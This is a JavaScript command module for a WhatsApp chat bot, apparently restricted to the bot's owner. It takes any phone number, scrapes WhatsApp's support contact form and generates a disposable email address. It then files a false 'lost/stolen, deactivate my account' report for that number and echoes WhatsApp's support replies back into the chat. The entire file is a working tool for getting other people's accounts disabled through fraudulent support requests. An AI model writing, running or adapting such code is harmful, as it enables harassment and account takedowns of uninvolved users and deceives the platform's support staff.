import cheerio from "cheerio"
import axios from "axios"
import util from 'util'
let handler = async (m, { conn, isOwner, usedPrefix, command, args }) => {
const q = args.join(" ")    
if (!q || !args[0]) throw '*[❗] Ensira o Número que Deseja Desativar em Formato Internacional, 𝙴X𝙴𝙼𝙿𝙻𝙾: +55 81 5555-5555*'
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta: " + q)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axios({ url, method: "POST", data: form, headers: { cookie } })
var payload = String(res.data)
if (payload.includes(`"payload":true`)) {
m.reply(`##- WhatsApp Support -##\n\nHola,\n\nObrigado por sua Mensagem.\n\nDesativamos sua conta do WhatsApp. Isso significa que sua conta está temporariamente desativada e será excluída automaticamente em 30 dias se você não registrar a conta novamente. Observação: a equipe de suporte ao cliente do WhatsApp não pode excluir sua conta manualmente.\n\nDurante o período de encerramento:\n • Seus contatos no WhatsApp ainda poderão ver seu nome e foto do perfil.\n • Todas as mensagens que seus contatos enviarem para a conta permanecerão com status pendente por até 30 dias.\n\nSe você deseja recuperar sua conta, registre-a novamente o mais rápido possível.\nRegistre novamente sua conta inserindo o código de 6 dígitos, o código que você recebe por SMS ou chamada telefônica. Se você se registrar novamente\n\nSe você tiver alguma outra dúvida ou preocupação, não hesite em nos contatar. Ficaremos felizes em ajudar!!`)
} else if (payload.includes(`"payload":false`)) {
m.reply(`##- WhatsApp Support -##\n\nHola:\n\nGracias por tu mensaje.\n\nPara proceder con tu solicitud, necesitamos que verifiques que este número de teléfono te pertenece. Por favor, envíanos documentación que nos permita verificar que el número es de tu propiedad, como una copia de la factura telefónica o el contrato de servicio.\n\nPor favor, asegúrate de ingresar tu número de teléfono en formato internacional completo. Para obtener más información sobre el formato internacional, consulta este artículo.\n\nSi tienes alguna otra pregunta o inquietud, no dudes en contactarnos. Estaremos encantados de ayudarte.`)
} else m.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
}
handler.command = /^(supportwa|swa|suporte|support|desactivarwa|mandsupport)$/i
handler.rowner = true 
export default handler
